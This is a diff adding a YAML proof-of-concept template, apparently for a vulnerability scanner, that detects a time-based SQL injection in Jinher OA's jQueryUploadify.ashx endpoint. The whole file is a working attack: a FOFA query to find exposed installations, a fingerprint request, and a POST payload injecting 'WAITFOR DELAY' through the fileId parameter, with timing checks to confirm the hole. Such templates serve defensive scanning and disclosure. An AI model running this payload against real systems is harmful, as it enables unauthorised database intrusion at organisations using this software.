@@ -1,0 +1,35 @@
+id: poc-yaml-jinher-jqueryuploadify-aspx-sqli
+info:
+  name: 金和OA jQueryUploadify.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+  path: 'c6/Jhsoft.Web.login/PassWordNew.aspx
+
+    c6/Jhsoft.Web.login/PassWordSlideFull.aspx
+
+    '
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: status_code == 200 && contains(body,"JHSoft")
+- method: POST
+  path: /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=delete&fileId=-99';WAITFOR+DELAY'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    body == "0" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
